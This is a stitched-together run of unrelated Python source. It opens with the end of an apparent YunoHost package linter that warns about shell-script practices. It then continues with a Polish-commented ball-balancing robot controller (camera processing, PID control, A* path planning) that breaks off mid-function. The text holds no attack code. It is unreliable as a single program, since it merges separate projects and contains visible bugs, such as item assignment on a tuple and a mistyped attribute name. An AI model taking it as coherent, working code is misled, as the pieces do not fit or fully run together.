        lines = '\n'.join(lines).replace("\\\n", "").split("\n")

        for line in lines:
            try:
                line = shlex.split(line, True)
                yield line
            except Exception as e:
                print_warning("%s : Could not parse this line (%s) : %s" % (self.path, e, line))

    def contains(self, command):
        """
        Iterate on lines to check if command is contained in line

        For instance, "app setting" is contained in "yunohost app setting $app ..."
        """
        return any(command in line
                   for line in [ ' '.join(line) for line in self.lines])

    def analyze(self):

        print_header(self.name.upper() + " SCRIPT")

        self.check_verifications_done_before_modifying_system()
        self.check_set_usage()
        self.check_helper_usage_dependencies()
        self.check_deprecated_practices()

    def check_verifications_done_before_modifying_system(self):
        """
        Check if verifications are done before modifying the system
        """

        if not self.contains("ynh_die") and not self.contains("exit"):
            return

        # FIXME : this really looks like a very small subset of command that
        # can be used ... also packagers are not supposed to use apt or service
        # anymore ...
        modifying_cmds = ("cp", "mkdir", "rm", "chown", "chmod", "apt-get", "apt",
                          "service", "find", "sed", "mysql", "swapon", "mount",
                          "dd", "mkswap", "useradd")
        cmds_before_exit = []
        for cmd in self.lines:
            cmd = " ".join(cmd)

            if "ynh_die" in cmd or "exit" in cmd:
                break
            cmds_before_exit.append(cmd)

        for modifying_cmd in modifying_cmds:
            if any(modifying_cmd in cmd for cmd in cmds_before_exit):
                print_error(
                    "[YEP-2.4] 'ynh_die' or 'exit' command is executed with system modification before (cmd '%s').\n"
                    "This system modification is an issue if a verification exit the script.\n"
                    "You should move this verification before any system modification." % modifying_cmd, False
                )
                return

    def check_set_usage(self):
        present = False

        if self.name in ["backup", "remove"]:
            present = self.contains("ynh_abort_if_errors") or self.contains("set -eu")
        else:
            present = self.contains("ynh_abort_if_errors")

        if self.name == "remove":
            # Remove script shouldn't use set -eu or ynh_abort_if_errors
            if present:
                print_error(
                    "[YEP-2.4] set -eu or ynh_abort_if_errors is present. "
                    "If there is a crash, it could put yunohost system in "
                    "a broken state. For details, look at "
                    "https://github.com/YunoHost/issues/issues/419"
                )
        elif not present:
            print_error(
                "[YEP-2.4] ynh_abort_if_errors is missing. For details, "
                "look at https://github.com/YunoHost/issues/issues/419"
            )

    def check_helper_usage_dependencies(self):
        """
        Detect usage of ynh_package_* & apt-get *
        and suggest herlpers ynh_install_app_dependencies and ynh_remove_app_dependencies
        """

        if self.contains("ynh_package_install") or self.contains("apt-get install"):
            print_warning(
                "You should not use `ynh_package_install` or `apt-get install`, "
                "use `ynh_install_app_dependencies` instead"
            )

        if self.contains("ynh_package_remove") or self.contains("apt-get remove"):
            print_warning(
                "You should not use `ynh_package_remove` or `apt-get remove`, "
                "use `ynh_remove_app_dependencies` instead"
            )

    def check_deprecated_practices(self):

        if self.contains("yunohost app setting"):
            print_warning("'yunohost app setting' shouldn't be used directly. Please use 'ynh_app_setting_(set,get,delete)' instead.")
        if self.contains("yunohost app checkurl"):
            print_warning("'yunohost app checkurl' is deprecated. Please use 'ynh_webpath_register' instead.")
        if self.contains("yunohost app checkport"):
            print_warning("'yunohost app checkport' is deprecated. Please use 'ynh_find_port' instead.")
        if self.contains("yunohost app initdb"):
            print_warning("'yunohost app initdb' is deprecated. Please use 'ynh_mysql_setup_db' instead.")
        if self.contains("exit"):
            print_warning("'exit' command shouldn't be used. Please use 'ynh_die' instead.")

        if self.contains("rm -rf"):
            print_error("[YEP-2.12] You should avoid using 'rm -rf', please use 'ynh_secure_remove' instead")
        if self.contains("sed -i"):
            print_warning("[YEP-2.12] You should avoid using 'sed -i', please use 'ynh_replace_string' instead")
        if self.contains("sudo"):
            print_warning(
                "[YEP-2.12] You should not need to use 'sudo', the script is being run as root. "
                "(If you need to run a command using a specific user, use 'ynh_exec_as')"
            )

        if self.contains("dd if=/dev/urandom") or self.contains("openssl rand"):
            print_warning(
                "Instead of 'dd if=/dev/urandom' or 'openssl rand', "
                "you might want to use ynh_string_random"
            )

        if self.contains("systemctl restart nginx") or self.contains("service nginx restart"):
            print_error(
                "Restarting nginx is quite dangerous (especially for web installs) "
                "and should be avoided at all cost. Use 'reload' instead."
            )

        if self.name == "install" and not self.contains("ynh_print_info") and not self.contains("ynh_script_progression"):
            print_warning(
                "Please add a few messages for the user, to explain what is going on "
                "(in friendly, not-too-technical terms) during the installation. "
                "You can use 'ynh_print_info' or 'ynh_script_progression' for this."
            )


def main():
    if len(sys.argv) != 2:
        print("Give one app package path.")
        exit()

    app_path = sys.argv[1]
    header(app_path)
    App(app_path).analyze()
    sys.exit(return_code)


if __name__ == '__main__':
    main()

if __name__ == '__main__':
    simulationMode = False    #czy uruchomic program w trybie symulacji? wymaga rowniez zmiany w ServoControllerModule.py oraz w ImageProcessingModule.py

    import ImageProcessingModule as IPM
    import ServoControllerModule as SCM
    import PIDControllerModule as PIDCM
    import DataLoggerModule as DLM
    import PathPlannerModule as PPM
    
    from time import sleep
    import time
    import pygame
    import math
    import MathModule as MM

    #wykonanie wstepnych czynnosci
    if simulationMode:
        import SimulationCommunicatorModule as SimCM
        simulationCommunicator = SimCM.SimulationCommunicator()
    else: simulationCommunicator = None
    
    imageProcessor = IPM.ImageProcessor(simulationCommunicator)
    servoController = SCM.ServoController()
    pathPlanner = PPM.PathPlanner()
        
    dataLogger = DLM.DataLogger()
    pidController = PIDCM.PIDController()
    pidController.servo_pos_limit = servoController.servo_pos_limit

    pygame.init()
    pygame.display.set_mode((100, 100))

    #roizpoczynanie procesu wykrywania kulki
    if simulationMode: simulationCommunicator.StartProcessing()
    imageProcessor.StartProcessing()
    pathPlanner.startProcessing(imageProcessor.obstacle_map)

    targetDeltaTime = 1.0 / 40.0    #czas jednej iteracji programu sterujacego
    updatedTime = 0.0
    servoUpdateDeltaTime = 1.0 / 60 #czas odswiezania pozycji serw
    servoUpdatedTime = 0.0

    ball_position_actual = (0.0, 0.0)
    ball_position_previous = (0.0, 0.0)

    #parametry trajektorii kulki
    angle = 0.0
    angleSpeed = 0.9
    angleRadius = 0.25
    angleRadiusFactor = 0.0
    path_targets = [(0.18, 0.18), (0.82, 0.82)]
    path_target_index = 0
    targetPos = path_targets[path_target_index]
    moveSpeed = 0.05
    movementMode = 0
    modeChangeTimeDelta = 25 #czas po jakim zmieniana jest trajektoria kulki
    modeChangeTimer = 0.0

    #jak dlugo wykonywany ma byc program
    duration = 10000
    timeout = time.time() + duration
    ball_just_found = True    #czy kulka dopiero zostala znaleziona i nalezy zresetowac predkosc?

    #glowna petla programu
    while time.time() <= timeout:
        timeStart = time.perf_counter()
        
        #oczekiwanie na odpowiedni moment do wykonania programu sterujacego
        if timeStart - updatedTime >= targetDeltaTime:
            updatedTime = time.perf_counter()
            
            #pobranie pozycji kulki
            ball_position_actual = imageProcessor.getBallPosition()
            if ball_position_actual[0] >= 0: pidController.setActualValue(ball_position_actual)
            else: pidController.setActualValue(pidController.value_target)
                
            #aktualizacja kontrolera PID
            pidController.update(targetDeltaTime)
            ball_position_previous = ball_position_actual
            
            #aktualizacja pozycji kulki w pathplannerze
            pathPlanner.setBallPosition(ball_position_actual)
            pidController.setTargetValue(pathPlanner.getPathTarget())
            
            #przechodzenie do kolejnego waypoint'a
            if MM.sqrMagnitude(ball_position_actual[0] - targetPos[0], ball_position_actual[1] - targetPos[1]) < 0.01:
                path_target_index = (path_target_index + 1) % len(path_targets)
                targetPos = path_targets[path_target_index]
                pathPlanner.setTargetPosition(targetPos)
            #print(str(pidController.value_target))
            
            #obslugiwanie wejscia z klawiatury
            killLoop = False
            for event in pygame.event.get():
                if event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_g:
                        pidController.increaseKP()
                        
                    elif event.key == pygame.K_b:
                        pidController.decreaseKP()
                        
                    elif event.key == pygame.K_h:
                        pidController.increaseKI()
                        
                    elif event.key == pygame.K_n:
                        pidController.decreaseKI()
                        
                    elif event.key == pygame.K_j:
                        pidController.increaseKD()
                        
                    elif event.key == pygame.K_m:
                        pidController.decreaseKD()
                        
                    elif event.key == pygame.K_q:
                        killLoop = True
                        
                    elif event.key == pygame.K_UP:
                        targetPos[1] -= moveSpeed
                        
                    elif event.key == pygame.K_DOWN:
                        targetPos[1] += moveSpeed
                        
                    elif event.key == pygame.K_RIGHT:
                        targetPos[0] += moveSpeed
                        
                    elif event.key == pygame.K_LEFT:
                        targetPos[0] -= moveSpeed
                        
                    elif event.key == pygame.K_p:
                        angleSpeed += 0.1
                        print("angleSpeed = " + str(angleSpeed))
                        
                    elif event.key == pygame.K_o:
                        angleSpeed -= 0.1
                        print("angleSpeed = " + str(angleSpeed))
                        
            if killLoop:
                break
            
            #ustawianie nowych pozycji serw
            servoController.moveServo(0, round(pidController.x_servo))
            servoController.moveServo(1, -round(pidController.y_servo))
            
            #dostepne trajektorie ruchu kulki
            if False:
                if movementMode == 0:    #ksztalt osemki
                    targetPos[0] = math.sin(angle)
                    targetPos[1] = math.sin(2.0 * angle)
                elif movementMode == 1:  #ksztalt okregu
                    targetPos[0] = math.sin(angle)
                    targetPos[1] = math.cos(angle)
                elif movementMode == 2:   #ksztalt paraboli
                    targetPos[0] = math.sin(angle)
                    targetPos[1] = math.cos(2.0 * angle)
                elif movementMode == 3:   #ksztalt litery S
                    targetPos[0] = math.sin(angle)
                    targetPos[1] = math.sin(2.0 * angle)
                    if angle > 2:
                        angleSpeed = -angleSpeed
                        angle = 2
                    elif angle < -2:
                        angleSpeed = -angleSpeed
                        angle = -2
                    
            #targetPos[0] = 0.5 + angleRadiusFactor * angleRadius * targetPos[0]
            #targetPos[1] = 0.5 + angleRadiusFactor * angleRadius * targetPos[1]
            #ustawianie docelowej pozycji kulki
            #pidController.setTargetValue(targetPos[0], targetPos[1])
            #pathPlanner.setTargetPosition(tuple(targetPos))
            angle += angleSpeed * targetDeltaTime
            angleRadiusFactor += 0.25 * targetDeltaTime
            angleRadiusFactor = min(angleRadiusFactor, 1.0)
            
            modeChangeTimer += targetDeltaTime
            if modeChangeTimer >= modeChangeTimeDelta:
                modeChangeTimer = 0.0
                angleRadiusFactor = 0.0
                movementMode += 1
                movementMode = movementMode % 4
            
            #dodawanie wpisow do DataLog'u
            if False:
                path_target = pathPlanner.getPathTarget()
                dataLogger.addRecord("timestamp", time.perf_counter())
                dataLogger.addRecord("ball_pos_x", ball_position_actual[0])
                dataLogger.addRecord("ball_pos_y", ball_position_actual[1])
                dataLogger.addRecord("target_pos_x", path_target[0])
                dataLogger.addRecord("target_pos_y", path_target[1])
                dataLogger.addRecord("KP", pidController.KP)
                dataLogger.addRecord("KI", pidController.KI)
                dataLogger.addRecord("KD", pidController.KD)
                dataLogger.addRecord("error_x", pidController.x_error)
                dataLogger.addRecord("error_y", pidController.y_error)
                dataLogger.addRecord("error_prev_x", pidController.x_prev_error)
                dataLogger.addRecord("error_prev_y", pidController.y_prev_error)
                dataLogger.addRecord("error_sum_x", pidController.x_error_sum)
                dataLogger.addRecord("error_sum_y", pidController.y_error_sum)
                dataLogger.addRecord("derivative_x", pidController.x_derivative)
                dataLogger.addRecord("derivative_y", pidController.y_derivative)
                dataLogger.addRecord("servo_actual_x", servoController.servo_actual_pos[0])
                dataLogger.addRecord("servo_actual_y", servoController.servo_actual_pos[1])
                dataLogger.addRecord("servo_target_x", servoController.servo_target_pos[0])
                dataLogger.addRecord("servo_target_y", servoController.servo_target_pos[1])
                dataLogger.saveRecord()
            
        #oczekiwanie na odpowiedni moment do aktualizacji serw
        if time.perf_counter() - servoUpdatedTime >= servoUpdateDeltaTime:
            servoController.update(time.perf_counter() - servoUpdatedTime)
            servoUpdatedTime = time.perf_counter()
            
            if simulationMode:
                simulationCommunicator.moveServos(servoController.servo_actual_pos)
                
        sleep(0.004) #4 milisekundy na odpoczynek :)
            
    print("Stopping program")
    #dataLogger.saveToFile("BallanceDataLog")
    if simulationMode: simulationCommunicator.StopProcessing()
    else: imageProcessor.StopProcessing()
    pathPlanner.stopProcessing()

simulationMode = False                    

if not simulationMode:
    import TensorflowProcessingModule as TPM
    from imutils.video.pivideostream import PiVideoStream

import MathModule as MM
import math, time, copy
import cv2
import numpy as np
from multiprocessing import Process, RawValue, RawArray
 
#program sluzacy do analizy obrazu z kamery, wykrywania kulki
class ImageProcessor:
    
    #parametry kamery
    camera_resolution = (256, 256)
    camera_framerate = 40
    
    corner_detecton_area = (0.08, 0.08, 0.14, 0.14) #prostakat, w ktorym szukana jest krawedz plyty, jest on powielany dla kazdego rogu obrazu
    detection_image_resolution = (200, 200)
    detection_image_resolution_cropped = (-1, -1)
    
    #rozmiar bitmapy przeszkod
    obstacle_map_size = 40
    obstacle_map_update_delta = 40
        
    def __init__(self, _simulationCommunicator=None):
        print("ImageProcessor object created")
        self.simulationCommunicator = _simulationCommunicator
        #wartosci-rezultaty przetwarzania obrazu
        self.result_x = RawValue('f', 0.0)
        self.result_y = RawValue('f', 0.0)
        self.key = RawValue('i', 0)
        
        self.obstacle_map = RawArray('i', ImageProcessor.obstacle_map_size**2)
        self.obstacle_map_update_counter = 0
        
    def getBallPosition(self):    #zwraca pozycje kulki
        if simulationMode: return self.simulationCommunicator.getBallPosition()
        return (self.result_x.value, self.result_y.value)
        
    def StartProcessing(self):   #uruchamia proces przetwarzajacy obraz
        print("Starting image processing")
        
        self.process = Process(target=ImageProcessor.ProcessImage, args=(self,))
        self.process.daemon = True
        self.process.start()
        #ImageProcessor.ProcessImage(self)
        
    def StopProcessing(self):    #wydaje polecenie do zatrzymania przetwarzania obrazu
        print("Stopping image processing")
        self.key.value = -666
        self.process.terminate()
        
    def ProcessImage(self):    #przetwarza obraz pobierajac klatke z kamery i wykonujac na niej operacje analizy
        
        #bufor dzielenia mapy przeszkod z innymi procesami
        self.obstacle_map_np = np.frombuffer(self.obstacle_map, dtype=np.int32).reshape(ImageProcessor.obstacle_map_size**2)
        
        #parametry trackera kulki
        self.ballTracker_pos = [ImageProcessor.detection_image_resolution[0]//2, ImageProcessor.detection_image_resolution[1]//2]
        self.ballTracker_size = 40
        self.ballTracker_result = [0, 0]
        
        if not simulationMode:
            self.tensorflowProcessor = TPM.TensorflowProcessor()
            videoStream = PiVideoStream(resolution=ImageProcessor.camera_resolution, framerate=ImageProcessor.camera_framerate).start()   #uruchamianie watku, ktory czyta kolejne klatki z kamery
        else:
            videoStream = self.simulationCommunicator
        
        time.sleep(1)
        self.frame_original = videoStream.read()
        
        lastTime = time.time()
        a = 190
        lastID = 0
        
        saveCounter = 0
        saveCount = 0
        
        while True:
            if self.key.value == -666: break
            
            #prosty licznik przetworzonych klatek w ciagu sekundy
            a = a + 1
            if a > 200:
                if ImageProcessor.detection_image_resolution_cropped[0] == -1:
                    ImageProcessor.detection_image_resolution_cropped = (np.size(self.frame_original, 0), np.size(self.frame_original, 1))
                print(str(a * 1.0 / (time.time() - lastTime)))
                lastTime = time.time()
                a = 0
            
            #synchronizacja pobierania nowej klatki z czestotliwascia kamery
            while True:
                frameGrabbed = videoStream.read()
                ID = id(frameGrabbed)
                if ID != lastID:
                    self.frame_original = frameGrabbed
                    lastID = ID
                    break
                elif not simulationMode:
                    time.sleep(0.01)
            
            #klatka przeznaczona do debugowania
            #self.frame_debug = copy.copy(self.frame_original)
            
            if not simulationMode: self.corners = ImageProcessor.FindBoardCorners(self)    #znajdowanie pozycji rogow plyty
            else: self.corners = self.simulationCommunicator.FindBoardCorners()
            ImageProcessor.ChangePerspective(self)    #zmiana perspektywy znalezionej tablicy, aby wygladala jak kwadrat
            #self.frame_original = self.frame_original[1:200, 1:200] #przycinanie zdjecia
            if not simulationMode: ImageProcessor.UpdateBallTracker(self)    #aktualizacja trackera kulki
            else:
                pos = self.simulationCommunicator.getBallPosition()
                self.ballTracker_result[0] = pos[0] * ImageProcessor.detection_image_resolution_cropped[0]
                self.ballTracker_result[1] = pos[1] * ImageProcessor.detection_image_resolution_cropped[1]
            ImageProcessor.UpdateObstacleMap(self)
            
            #ustawianie znalezionej pozycji kulki w zmiennych dzielonych miedzy procesami
            self.result_x.value = self.ballTracker_result[0] / ImageProcessor.detection_image_resolution_cropped[0]
            self.result_y.value = self.ballTracker_result[1] / ImageProcessor.detection_image_resolution_cropped[1]
            
            #cv2.imshow("Frame debug", self.frame_debug)
            if saveCounter < saveCount:
                cv2.imwrite("Frame" + str(saveCounter) + ".png", self.frame_original)
                saveCounter += 1
                
            cv2.imshow("Frame Casted", self.frame_original)
            key = cv2.waitKey(1) & 0xFF
            #if key == ord("q"):
            #    break
            
        videoStream.stop()
            
    #aktualizuje tracker kulki
    def UpdateBallTracker(self):
        self.ballTracker_pos[0] = MM.clamp(self.ballTracker_pos[0], 0, ImageProcessor.detection_image_resolution_cropped[0] - self.ballTracker_size)
        self.ballTracker_pos[1] = MM.clamp(self.ballTracker_pos[1], 0, ImageProcessor.detection_image_resolution_cropped[1] - self.ballTracker_size)
        
        self.ballTracker_pos[0] = int(self.ballTracker_pos[0])
        self.ballTracker_pos[1] = int(self.ballTracker_pos[1])
        
        #przygotowanie klatki z kamery do analizy
        tracker_frame = self.frame_original[self.ballTracker_pos[1]:self.ballTracker_pos[1]+self.ballTracker_size,
                                            self.ballTracker_pos[0]:self.ballTracker_pos[0]+self.ballTracker_size]
        tracker_frame = cv2.cvtColor(tracker_frame, cv2.COLOR_BGR2GRAY)
        
        #analiza klatki z uzyciem sieci neuronowych
        result = self.tensorflowProcessor.getBallPosition(tracker_frame)
        result = np.round(result * self.ballTracker_size).astype("int")
        
        self.ballTracker_result[0] = self.ballTracker_pos[0] + result[0]
        self.ballTracker_result[1] = self.ballTracker_pos[1] + result[1]
        
        #zaznaczanie wizualne pozycji kulki
        #cv2.circle(self.frame_original, tuple(self.ballTracker_result), 1, (0, 0, 255), -1)
        
        #aktualizacja pozycji trackera
        self.ballTracker_pos[0] = MM.lerp(self.ballTracker_pos[0], self.ballTracker_result[0] - self.ballTracker_size // 2, 0.7)
        self.ballTracker_pos[1] = MM.lerp(self.ballTracker_pos[1], self.ballTracker_result[1] - self.ballTracker_size // 2, 0.7)
    
    #znajduje pozycje krawedzi plyty
    def FindBoardCorners(self):
        corners = np.zeros((4, 2), dtype=np.int32)
        corner_detection_area_pixels = [round(self.corner_detecton_area[0] * self.camera_resolution[0]),
                                       round(self.corner_detecton_area[1] * self.camera_resolution[1]),
                                       round(self.corner_detecton_area[2] * self.camera_resolution[0]),
                                       round(self.corner_detecton_area[3] * self.camera_resolution[1])]
        for i in range(4):
            flipX = False
            flipY = False
            detectionArea = copy.copy(corner_detection_area_pixels)    #domyslnie lewy gorny
            if i == 1 or i == 2:
                detectionArea[0] = self.camera_resolution[0] - detectionArea[0] - detectionArea[2]
                flipX = True
            if i == 3 or i == 2:
                detectionArea[1] = self.camera_resolution[1] - detectionArea[1] - detectionArea[3]
                flipY = True
                
            rect = (detectionArea[0], detectionArea[1], detectionArea[0] + detectionArea[2], detectionArea[1] + detectionArea[3])
            #cv2.rectangle(self.frame_debug, (rect[0], rect[1]), (rect[2], rect[3]), (0, 255, 0), 1);
        
            img = self.frame_original[rect[1]:rect[3], rect[0]:rect[2]]
            img = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
            img = cv2.resize(img, (40, 40), interpolation=cv2.INTER_NEAREST)
            
            if flipX and flipY: img = cv2.flip(img, -1)
            elif flipX: img = cv2.flip(img, 1)
            elif flipY: img = cv2.flip(img, 0)
            #cv2.imshow("Corner " + str(i), img)
            
            result = self.tensorflowProcessor.getCornerPosition(img)
            corner = np.round(result * 40.0).astype("int")
            
            if flipX and flipY: corners[i] = (40 - corner[0] + detectionArea[0], 40 - corner[1] + detectionArea[1])
            elif flipX: corners[i] = (40 - corner[0] + detectionArea[0], corner[1] + detectionArea[1])
            elif flipY: corners[i] = (corner[0] + detectionArea[0], 40 - corner[1] + detectionArea[1])
            else: corners[i] = (corner[0] + detectionArea[0], corner[1] + detectionArea[1])
            #cv2.circle(self.frame_debug, corners[i], 1, (0, 0, 255), 1)

        return corners

    #zmienia perspektywe obrazu z kamery tak, aby niewidoczne bylo przechylenie plyty
    def ChangePerspective(self):
        pts = np.array(self.corners, np.float32)
        res = self.detection_image_resolution
        pts2 = np.float32([[0,0],[res[0],0],[res[0], res[1]], [0, res[1]]])

        M = cv2.getPerspectiveTransform(pts, pts2)
        self.frame_original = cv2.warpPerspective(self.frame_original, M, res)
        
    #aktualizuje mape przeszkod na plycie
    def UpdateObstacleMap(self):
        self.obstacle_map_update_counter += 1
        if self.obstacle_map_update_counter >= ImageProcessor.obstacle_map_update_delta:
            self.obstacle_map_update_counter = 0
            frame = cv2.resize(self.frame_original, (ImageProcessor.obstacle_map_size, ImageProcessor.obstacle_map_size), interpolation=cv2.INTER_NEAREST)
            frame = np.int32(frame)
            frame = 2 * frame[...,2] - frame[...,1] - frame[...,0]
            np.copyto(self.obstacle_map_np, frame.ravel())
            #self.obstacle_map = frame[...,2].ravel()

import MathModule as MM

class PIDController:
    
    #operacje zmiany pidow
    def increaseKP(self):
        self.KP += 50
        print("KP = " + str(self.KP))
        
    def increaseKI(self):
        self.KI += 50
        print("KI = " + str(self.KI))
        
    def increaseKD(self):
        self.KD += 50
        print("KD = " + str(self.KD))
        
    def decreaseKP(self):
        self.KP -= 50
        print("KP = " + str(self.KP))
        
    def decreaseKI(self):
        self.KI -= 50
        print("KI = " + str(self.KI))
        
    def decreaseKD(self):
        self.KD -= 50
        print("KD = " + str(self.KD))
        
    #ustawia aktualna wartosc
    def setActualValue(self, x, y=None):
        if y is not None:
            self.value_actual[0] = MM.lerp(self.value_actual[0], x, self.value_smoothing)
            self.value_actual[1] = MM.lerp(self.value_actual[1], y, self.value_smoothing)
        else:
            self.value_actual[0] = MM.lerp(self.value_actual[0], x[0], self.value_smoothing)
            self.value_actual[1] = MM.lerp(self.value_actual[1], x[1], self.value_smoothing)
        
    #ustawia docelowa wartosc
    def setTargetValue(self, x, y=None):
        if y is not None:
            self.value_target[0] = x
            self.value_target[1] = y
        else:
            self.value_target[0] = x[0]
            self.value_target[1] = x[1]
    
    def __init__(self):
        self.servo_pos_limit = (1000, 1000)    #ograniczenia wychylen serw (w skali od 0 do 1000)
        self.value_target = [0.5, 0.5]    #docelowa wartosc, ktora ma byc osiagnieta przez kontroler
        self.value_actual = [0.5, 0.5]    #aktualna wartosc
        self.value_smoothing = 0.7        #wspolczynnik wygladzania aktualizacji aktualnej wartosci

        #wspolczynniki kontroli
        self.KP = 1.5 * 1000   #wzmocnienie czesci proporcjonalnej
        self.KI = 7.0 * 1000    #wzmocnienie czesci calkujacej
        self.KD = 0.5 * 1000   #wzmocnienie czesci rozniczkujacej

        #pozycja serwa
        self.x_servo = 0.0
        self.y_servo = 0.0

        #wartosc bledu
        self.x_error = 0.0
        self.y_error = 0.0

        #wartosci poprzednich bledow
        self.x_prev_error = 0.0
        self.y_prev_error = 0.0

        #zmiana bledu w czasie
        self.x_derivative = 0.0
        self.y_derivative = 0.0

        #calkowita suma bledow
        self.x_error_sum = 0.0
        self.y_error_sum = 0.0

    #aktualizuje kontrolea PID
    def update(self, deltaTime):
        #liczenie bledu
        self.x_error = self.value_target[0] - self.value_actual[0]
        self.y_error = self.value_target[1] - self.value_actual[1]
        
        #print("Error = ( " + str(self.x_error) + "; " + str(self.y_error) + ")")

        #liczenie pochodnej
        self.x_derivative = (self.x_error - self.x_prev_error) / deltaTime
        self.y_derivative = (self.y_error - self.y_prev_error) / deltaTime

        self.x_prev_error = self.x_error
        self.y_prev_error = self.y_error

        self.x_error_sum += self.x_error * deltaTime
        self.y_error_sum += self.y_error * deltaTime
        
        #zmiana pozycji serw z uwzglednieniem bledu biezacego, przyszlego oraz przeszlego
        self.x_servo = (self.x_error * self.KP) + (self.x_derivative * self.KD) + (self.x_error_sum * self.KI)
        self.y_servo = (self.y_error * self.KP) + (self.y_derivative * self.KD) + (self.y_error_sum * self.KI)
        
        self.x_servo = MM.clamp(self.x_servo, -self.servo_pos_limit[0], self.servo_pos_limit[0])
        self.y_servo = MM.clamp(self.y_servo, -self.servo_pos_limit[1], self.servo_pos_limit[1])
        
        self.x_error_sum = MM.clamp(self.x_error_sum, -1.0, 1.0) * 0.8
        self.y_error_sum = MM.clamp(self.y_error_sum, -1.0, 1.0) * 0.8

import cv2
import numpy as np
import MathModule as MM
import time
from multiprocessing import Process, RawValue
from collections import deque
import copy

#program odpowiadajacy za planiwanie sciezki kulki
class PathPlanner:
    
    obstacle_map_size = 40    #rozmiar mapy przeszkod
    obstacle_map_update_delta = 4    #co ile sekund odswiezana ma byc mapa przeszkod?
    path_sub_update_delta = 0.3    #co ile sekund aktualizowac podsciezke?
    
    def __init__(self):
        print("PathPlanner object created")
        
        self.obstacle_map = None
        self.path = None
        self_path_last_index = 0
        self.proximity_map = np.zeros((PathPlanner.obstacle_map_size, PathPlanner.obstacle_map_size)) #tablica 2D z kosztem bliskosci wykrytych przeszkod
        
        self.ball_pos_x = RawValue('f', 0.5)
        self.ball_pos_y = RawValue('f', 0.5)
        self.target_pos_x = RawValue('f', 0.25)
        self.target_pos_y = RawValue('f', 0.25)
        self.path_x = RawValue('f', 0.5)
        self.path_y = RawValue('f', 0.5)
        
    def setBallPosition(self, pos):
        self.ball_pos_x.value = pos[1]
        self.ball_pos_y.value = pos[0]
        
    def setTargetPosition(self, pos):
        self.target_pos_x.value = pos[1]
        self.target_pos_y.value = pos[0]
        
    def getPathTarget(self):
        return (self.path_x.value, self.path_y.value)
        
    def startProcessing(self, _frame_array):
        print("Starting PathPlanner process")
        self.process = Process(target=PathPlanner.doPlanning, args=(self,_frame_array))
        self.process.daemon = True
        self.process.start()
        
    def stopProcessing(self):
        print("Stopping PathPlanner process")
        self.process.terminate()
        
    def doPlanning(self, _frame_array):
        obstacle_map_update_time = 0.0
        path_sub_update_time = 0.0
        while True:
            if time.perf_counter() - obstacle_map_update_time >= PathPlanner.obstacle_map_update_delta:
                obstacle_map_update_time = time.perf_counter()
                PathPlanner.updateObstacleMap(self, _frame_array)
                
            if time.perf_counter() - path_sub_update_time >= PathPlanner.path_sub_update_delta:
                path_sub_update_time = time.perf_counter()
                PathPlanner.UpdateSubPath(self)
        
    #aktualizuje bitmape przeszkod
    def updateObstacleMap(self, _frame_array):
        frame = np.frombuffer(_frame_array, dtype=np.int32)
        frame = np.clip(frame, 0, 255).astype('uint8').reshape((PathPlanner.obstacle_map_size, PathPlanner.obstacle_map_size))
        #cv2.imshow("Map", frame)
        frame = cv2.inRange(frame, 100, 255)
        #kernel = np.ones((2,2), np.uint8)
        #frame = cv2.dilate(frame, kernel, iterations=1)
        self.obstacle_map = frame
        
        #aktualizacja mapy bliskosci przeszkod
        self.proximity_map.fill(0)
        size = PathPlanner.obstacle_map_size - 1
        sides = ((1, 0), (1, -1), (0, -1), (-1, -1), (-1, 0), (-1, 1), (0, 1), (1, 1))
        for x in range(1, size):
            for y in range(1, size):
                if frame[x, y] > 0:
                    for side in sides:
                        self.proximity_map[x + side[0], y + side[1]] += 1
        
        #np.clip(self.proximity_map, 0, 1, self.proximity_map)
        self.proximity_map *= 0#5000                    
        
        #aktualizacja glownej sciezki
        start = (round(self.ball_pos_x.value * PathPlanner.obstacle_map_size), round(self.ball_pos_y.value * PathPlanner.obstacle_map_size))
        end = (round(self.target_pos_x.value * PathPlanner.obstacle_map_size), round(self.target_pos_y.value * PathPlanner.obstacle_map_size))
        self.path = PathPlanner.a_star(self, start, end)
        self.path_last_index = len(self.path)-1
        
    #aktualizuje podsciezke przy uzyciu algorytmu A*
    def UpdateSubPath(self):
        if self.path == None: return None
        
        ball_pos = (self.ball_pos_x.value, self.ball_pos_y.value)
        path = self.path
        start = (round(ball_pos[0] * PathPlanner.obstacle_map_size), round(ball_pos[1] * PathPlanner.obstacle_map_size))                    
        end = path[self.path_last_index]                    
        
        #wyszukiwanie binarne najdlaszego punktu na sciezce, do ktorego da sie dojsc w linii prostej
        x = 0
        y = self.path_last_index                    
        center = 0                    
        index = 0
        while x <= y:                    
            center = (x + y) // 2                    
            if not PathPlanner.Raycast(self, start, path[center]):                    
                index = center                    
                x = center + 1
            else: y = center - 1                    
        
        end = (end[0] / PathPlanner.obstacle_map_size, end[1] / PathPlanner.obstacle_map_size)                    
        dist = 0.13 * MM.clamp(4 * MM.magnitude(ball_pos[0] - end[0], ball_pos[1] - end[1]), 0.4, 1)                    
        #print(str(MM.magnitude(ball_pos[0] - self.target_pos_x.value, ball_pos[1] - self.target_pos_y.value)))
        
        vec2go = MM.normalized(path[index][0] - start[0], path[index][1]- start[1])    #wektor docelowego ruchu kulki
        mag = MM.magnitude(0.5 - ball_pos[0], 0.5 - ball_pos[1])    #odleglosc kulki od srodka plyty
        vec2center = ((0.5 - ball_pos[0]) / mag, (0.5 - ball_pos[1]) / mag)    #wektor z pozycji kulki do srodka plyty
        edgeReluctance = 0.012 / (0.6 - min(mag, 0.5))                    
        print(edgeReluctance)                    
        
        self.path_x.value = vec2go[1] * dist + ball_pos[1] + vec2center[1] * edgeReluctance                    
        self.path_y.value = vec2go[0] * dist + ball_pos[0] + vec2center[0] * edgeReluctance                    
            
        frame = copy.copy(self.obstacle_map)
        #frame = np.uint8(frame)
        frame = cv2.cvtColor(frame, cv2.COLOR_GRAY2BGR)
        
        #DEBUG
        #for p in path:
        #    if PathPlanner.isPointWithinMap(self, p):
        #        frame[p[0], p[1]] = [255, 255, 0]
            
        PathPlanner.PaintRay(self, start, path[index], frame)                    
        frame = cv2.resize(frame, (200, 200), interpolation=cv2.INTER_NEAREST)
        
        cv2.imshow("PathPlanner frame", frame)
        key = cv2.waitKey(1) & 0xFF
        
    #sprawdza, czy punkt wewnatrz mapy przeszkod
    def isPointWithinMap(self, point):
        size = self.obstacle_map_size
        return point[0] >= 0 and point[0] < size and point[1] >= 0 and point[1] < size
        
    #algorytm A* wyznaczajacy sciezke z punktu A do B
    def a_star(self, A, B):
        start = B
        end = A
